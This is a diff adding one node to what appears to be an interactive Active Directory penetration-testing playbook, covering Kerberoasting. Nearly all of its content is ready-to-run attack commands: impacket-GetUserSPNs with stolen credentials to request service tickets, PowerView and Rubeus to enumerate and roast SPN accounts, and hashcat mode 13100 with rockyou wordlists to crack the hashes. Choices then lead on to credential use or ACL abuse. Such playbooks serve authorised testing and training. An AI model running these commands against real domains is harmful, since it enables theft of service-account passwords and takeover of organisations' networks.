@@ -1,0 +1,18 @@
+{
+  "id": "kerberoast",
+  "phase": "AD",
+  "title": "Kerberoasting",
+  "body": "Request service tickets for any SPN-enabled account and crack them offline. Service accounts often have weak passwords.",
+  "cmd": "# From Kali with creds\nimpacket-GetUserSPNs domain.com/user:'pass' \\\n  -dc-ip $ip -request -outputfile tgs.txt\n\n# Check what accounts exist\nimpacket-GetUserSPNs domain.com/user:'pass' \\\n  -dc-ip $ip\n\n# PowerView on Windows\nGet-NetUser -SPN | select samaccountname,serviceprincipalname\n\n# Rubeus on Windows\n.\\Rubeus.exe kerberoast /outfile:tgs.txt\n\n# Crack\nhashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 tgs.txt rockyou.txt -r best64.rule",
+  "warn": null,
+  "choices": [
+    {
+      "label": "Cracked service account hash!",
+      "next": "creds_found"
+    },
+    {
+      "label": "No luck cracking — try ACL abuse",
+      "next": "acl_abuse"
+    }
+  ]
+}
